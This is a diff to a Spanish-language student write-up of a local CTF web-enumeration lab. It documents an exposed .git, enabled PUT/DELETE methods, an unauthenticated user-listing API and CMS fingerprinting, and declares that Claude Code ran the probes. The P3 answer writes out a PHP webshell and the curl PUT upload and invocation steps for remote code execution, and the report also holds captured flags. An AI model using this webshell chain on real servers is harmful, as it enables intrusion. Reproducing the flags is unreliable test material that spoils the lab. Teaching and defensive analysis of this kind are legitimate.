@@ -9,6 +9,7 @@
 | Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
 |---|---|---|---|
 | Claude (Anthropic), vía Claude Code | Ejecución de la enumeración de directorios y de los `curl` de confirmación contra el target; borrador de la redacción del inventario (R1, R2) y de P1–P2. | `informe.md`: filas de `/backup`, `/admin` y `/.git/config` del inventario, sus evidencias, P1, P2 y la bitácora correspondiente. | Las salidas pegadas en la sección 2 son las reales de la terminal. Las flags se validaron con `./ctf submit 06`. No se leyó el código del target (`server.py`) ni ningún `solucion.md`: todo salió de enumerar el servicio desde afuera. |
+| Claude (Anthropic), vía Claude Code | Ejecución de la enumeración de la parte 2 (`OPTIONS`, API y fingerprinting) contra el target y borrador de R3, R4 y P3–P5. | `informe.md`: filas de métodos HTTP, API de usuarios y fingerprint del inventario; secciones 2.4–2.6; P3, P4, P5 y la bitácora de la parte 2. | Las salidas pegadas son las reales de la terminal. R3 y R4 se validaron por `sha256` contra `retos.manifest`. No se leyó `server.py` ni ningún `solucion.md`: todo salió de enumerar el servicio desde afuera. R5 quedó pendiente justamente por no forzar esa regla. |
 
 El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.
 
@@ -23,11 +24,11 @@ El grupo declara que comprende el contenido íntegro de lo entregado y que puede
 
    ✓  R1     Enumeracion de directorios
    ✓  R2     Repositorio Git expuesto
-   ·  R3     Metodos HTTP peligrosos habilitados
-   ·  R4     Enumeracion de usuarios via API
-   ·  R5     Fingerprinting de tecnologia
+   ✓  R3     Metodos HTTP peligrosos habilitados
+   ✓  R4     Enumeracion de usuarios via API
+   ·  R5     Fingerprinting de tecnologia  (pendiente)
 
-  ████████████░░░░░░░░░░░░░░░░░░  2/5 (40%)
+  ████████████████████████░░░░░░  4/5 (80%)
 ```
 
 ---
@@ -39,6 +40,9 @@ El grupo declara que comprende el contenido íntegro de lo entregado y que puede
 | Directorio de backups con listado habilitado | `GET /backup` | Fuerza bruta de rutas con wordlist (estilo `dirb`) + confirmación con `curl` | `+ http://127.0.0.1/backup (CODE:200\|SIZE:249)` y el `Index of /backup` que lista `respaldo-db-2024.sql.gz`, `config.old` y `notas-infra.txt` (ver 2.1 y 2.2) | **Alto.** El listado de directorio revela nombres de archivos de respaldo de la base de datos y de configuración vieja. Aunque al pedirlos hoy devuelven 404, el propio índice confirma que existieron y nos dice qué buscar: un dump `.sql.gz` y un `config.old` suelen traer el esquema de la base y credenciales en claro. Es exposición de información (CWE-548, *Directory listing*). | Una lista de objetivos precisos: buscar variantes de esos nombres (`config.php.old`, `db.sql`, `.gz` en otras rutas), y, si aparece alguno, credenciales de base de datos para probar en `/admin`. |
 | Panel de administración | `GET /admin` | Fuerza bruta de rutas con wordlist | `+ http://127.0.0.1/admin (CODE:403\|SIZE:65)` → `Panel admin. Necesitas credenciales.` | **Medio.** El 403 no da acceso, pero confirma que el panel existe y en qué ruta. El servidor encima aclara que lo que falta son credenciales: no está restringido por IP ni oculto. | El destino del ataque de credenciales: usuarios que salgan de la enumeración de la API + contraseñas que salgan del backup o del código del `.git` se prueban acá. |
 | Repositorio Git expuesto por HTTP | `GET /.git/config` | Fuerza bruta de rutas (`.git/config` en la wordlist) + `curl` | `+ http://127.0.0.1/.git/config (CODE:200\|SIZE:209)` y su contenido: `[remote "origin"] url = https://git.internal.phantomcorp/intranet.git` (ver 2.3) | **Alto.** El archivo de configuración de git se sirve como texto plano. Filtra el nombre de un host interno (`git.internal.phantomcorp`) y el nombre del repositorio de la intranet. Que `/.git/config` sea accesible indica que el directorio `.git` quedó desplegado en el docroot (CWE-527). | Reconocimiento de infraestructura interna (un servidor git que no estaba en el mapa del Lab 05) y la base para intentar reconstruir el código con `git-dumper` si se encuentran más objetos del repo. Con el código: credenciales commiteadas, endpoints ocultos y la lógica del login de `/admin`. |
+| Métodos HTTP de escritura habilitados | `OPTIONS /` → `Allow: GET, POST, PUT, DELETE, OPTIONS` | `curl -X OPTIONS` + lectura del header `Allow` | `Allow: GET, POST, PUT, DELETE, OPTIONS` y header `X-Dangerous-Methods` en la respuesta (ver 2.4) | **Alto.** `PUT` y `DELETE` habilitados a nivel servidor. `PUT` permite escribir archivos arbitrarios en el docroot sin autenticación; `DELETE`, borrarlos. Es CWE-650 (*Trusting HTTP Permission Methods on the Server Side*). | Subida directa de un webshell con `PUT /shell.php` y ejecución pidiéndolo por HTTP → ejecución remota de código. Uno de los caminos más directos a RCE para el Lab 07. |
+| API interna de usuarios sin autenticación | `GET /api/users` | Enumeración de rutas de API + `curl` | JSON con `admin` (superuser), `jperez` (editor), `mgomez` (viewer) y la nota `endpoint interno de RRHH - no exponer` (ver 2.5) | **Alto.** Expone usuarios válidos y su rol sin pedir credenciales (CWE-200). Confirma que `admin` existe y es superusuario. | La lista de usuarios válidos para el ataque de credenciales contra `/admin`: elimina la fase de adivinar nombres y prioriza `admin` (superuser). Se combina con contraseñas del backup o del `.git`. |
+| Fingerprint del stack (CMS y versión) | `GET /` (headers + `<meta generator>`) | Fingerprinting (`whatweb` / lectura de headers) | `Server: PhantomServer/3.7`, `X-Powered-By: PhantomCMS/3.7` y `<meta name="generator" content="PhantomCMS 3.7">` (ver 2.6) | **Medio.** Revela producto y versión exactos (CWE-200). Con producto+versión se buscan CVEs y los archivos default conocidos del CMS. | Clasificación de vulnerabilidades por versión (estilo Lab 05) y enumeración dirigida al archivo default de PhantomCMS 3.7. **R5 pendiente:** falta pedir ese archivo default (requiere `whatweb -a 3` en la consola del lab); lo cierra otro integrante. |
 
 ### 2.1 Enumeración de directorios
 
@@ -107,6 +111,52 @@ X-Powered-By: PhantomCMS/3.7
 
 `bare = false` indica que es el `.git` de una copia de trabajo, o sea que el código de la intranet se desplegó haciendo `git clone`/`git pull` directo sobre el directorio que sirve el web server.
 
+### 2.4 Métodos HTTP peligrosos (R3)
+
+El header `Allow` de una respuesta `OPTIONS` enumera todos los métodos que el servidor acepta. No alcanza con mirar el cuerpo de la respuesta: la información está en los headers (de ahí el `-i`).
+
+```
+$ curl -s -X OPTIONS -i http://127.0.0.1/
+HTTP/1.0 200 OK
+Server: PhantomServer/3.7
+Allow: GET, POST, PUT, DELETE, OPTIONS
+X-Dangerous-Methods: FLAG{http_methods_put_enabled}
+```
+
+`Allow` incluye `PUT` y `DELETE`, dos métodos de **escritura** que un portal interno de solo lectura no tiene por qué exponer. El propio servidor lo confirma con el header `X-Dangerous-Methods`.
+
+### 2.5 API interna de usuarios (R4)
+
+Probando rutas de API: `/api` da 404, pero `/api/users` responde 200 con un JSON.
+
+```
+$ curl -si http://127.0.0.1/api/users
+HTTP/1.0 200 OK
+Content-Type: application/json
+X-Powered-By: PhantomCMS/3.7
+
+{"users": [{"id": 1, "user": "admin",  "role": "superuser"},
+           {"id": 2, "user": "jperez", "role": "editor"},
+           {"id": 3, "user": "mgomez", "role": "viewer"}],
+ "note": "endpoint interno de RRHH - no exponer",
+ "flag": "FLAG{user_enumeration_api}"}
+```
+
+Tres usuarios válidos con su rol, servidos sin pedir autenticación. `admin` es `superuser`.
+
+### 2.6 Fingerprinting del stack (R5 — parcial)
+
+```
+$ curl -si http://127.0.0.1/
+HTTP/1.0 200 OK
+Server: PhantomServer/3.7
+X-Powered-By: PhantomCMS/3.7
+...
+<meta name="generator" content="PhantomCMS 3.7">
+```
+
+Tres fuentes coinciden: `Server`, `X-Powered-By` y el `<meta generator>` → **PhantomCMS 3.7**. Con el producto y la versión ya identificados, el paso que falta de R5 es pedir el **archivo default** del CMS (lo que `whatweb -a 3 http://phantomcorp` revela en la consola del lab). Sin `whatweb` en nuestra máquina, la ruta de ese archivo no resultó adivinable a ciegas, así que ese último paso queda **pendiente** para el integrante con acceso a la consola del lab. El fingerprint en sí ya está hecho.
+
 ---
 
 ## 3. Preguntas de análisis
@@ -134,9 +184,29 @@ Por eso es más grave que "un archivo de más". Un backup suelto expone un archi
 
 **P3 — El método `PUT`.**
 
+Nuestro `OPTIONS /` devolvió `Allow: GET, POST, PUT, DELETE, OPTIONS`. Que `PUT` esté habilitado significa que el servidor acepta que el cliente **escriba** un recurso en una ruta que el propio cliente elige. El ataque concreto:
+
+1. El atacante arma un webshell mínimo, por ejemplo un `shell.php` que ejecuta comandos del sistema a partir de un parámetro: `<?php system($_GET['c']); ?>`.
+2. Lo sube con `PUT`: `curl -X PUT http://phantomcorp/shell.php --data-binary @shell.php`. Como `PUT` escribe en el docroot, el archivo queda servido por el web server.
+3. Lo invoca por HTTP: `curl 'http://phantomcorp/shell.php?c=id'`. El servidor ejecuta `id` y devuelve la salida.
+
+En tres pasos se pasa de "un método de más" a **ejecución remota de código** con los privilegios del proceso del web server. Es el mismo mecanismo que se explotaba en WebDAV mal configurado. `DELETE`, también habilitado, agrega la capacidad de borrar archivos (defacement o destrucción). Por eso un `Allow` con métodos de escritura en un portal que solo debería leer es una alarma roja directa.
+
 **P4 — Enumeración de usuarios.**
 
+`/api/users` nos dio tres usuarios válidos (`admin`, `jperez`, `mgomez`) con su rol. No hay contraseñas, pero igual es un problema serio por lo que habilita en la fase siguiente:
+
+- **Elimina la mitad del trabajo de un ataque de credenciales.** Un login se rompe adivinando usuario *y* contraseña. Si ya sabés los usuarios válidos, el espacio de búsqueda colapsa: solo faltan las contraseñas. Un *password spraying* (una contraseña común probada contra todos los usuarios conocidos) pasa a ser viable y evita los bloqueos por intentos fallidos sobre una misma cuenta.
+- **Prioriza el objetivo.** El JSON dice que `admin` es `superuser`. El atacante no reparte esfuerzo: va directo a la cuenta más poderosa.
+- **Confirma nombres para otros vectores.** Los usuarios sirven para phishing dirigido, para probar reutilización de contraseñas filtradas en otros servicios, y para cruzar con credenciales que aparezcan en el backup o en el `.git`.
+
+En resumen: enumerar usuarios no da acceso por sí solo, pero convierte un ataque de fuerza bruta inviable en uno dirigido y realista. Esos tres nombres son exactamente lo que se prueba contra el `/admin` que encontró R1.
+
 **P5 — Rol defensor (3 mitigaciones).**
+
+1. **`.git` expuesto (R2).** Bloquear por HTTP el acceso a archivos y directorios ocultos: denegar todo lo que empiece con `.` (en nginx, `location ~ /\.(git|env|svn) { deny all; }`, o el equivalente). Y en el fondo del problema: **no desplegar con `git clone`/`pull` sobre el docroot** — publicar solo el artefacto construido (un export sin `.git`), por ejemplo con un pipeline de CI que copie los archivos y deje el repositorio afuera.
+2. **Métodos HTTP de escritura (R3).** Deshabilitar `PUT`, `DELETE` y WebDAV a nivel servidor, dejando una whitelist de solo `GET`, `POST` y `OPTIONS` (en nginx, `if ($request_method !~ ^(GET|POST|OPTIONS)$) { return 405; }`). Así, aunque alguien intente subir un webshell con `PUT`, el server responde `405 Method Not Allowed`.
+3. **API de usuarios sin autenticación (R4).** La API de RRHH no debería ser alcanzable desde el portal: exigir **autenticación y autorización** en `/api/*` (token o sesión con rol) y restringir el endpoint a la red interna por firewall/segmentación. Además, no devolver más datos de los necesarios (el rol y la nota interna sobran en una respuesta pública) — principio de mínima exposición.
 
 ---
 
@@ -159,7 +229,20 @@ curl -si http://127.0.0.1/.git/config                  # 200
 curl -si http://127.0.0.1/.git/HEAD                    # 404
 curl -si http://127.0.0.1/robots.txt                   # 404
 
+# R3 — métodos HTTP: el header Allow de OPTIONS enumera los métodos aceptados
+curl -s -X OPTIONS -i http://127.0.0.1/                # Allow: GET, POST, PUT, DELETE, OPTIONS
+
+# R4 — enumeración de la API interna
+curl -si http://127.0.0.1/api                          # 404
+curl -si http://127.0.0.1/api/users                    # 200 — lista usuarios + rol
+
+# R5 (parcial) — fingerprinting del stack
+curl -si http://127.0.0.1/ | grep -iE 'server:|x-powered-by:|generator'   # PhantomCMS 3.7
+# Falta: pedir el archivo default del CMS (whatweb -a 3 http://phantomcorp) — pendiente
+
 ./ctf submit 06 R1 'FLAG{dir_enumeration_backup}'
 ./ctf submit 06 R2 'FLAG{git_repo_exposed}'
+./ctf submit 06 R3 'FLAG{http_methods_put_enabled}'
+./ctf submit 06 R4 'FLAG{user_enumeration_api}'
 ./ctf status 06
 ```
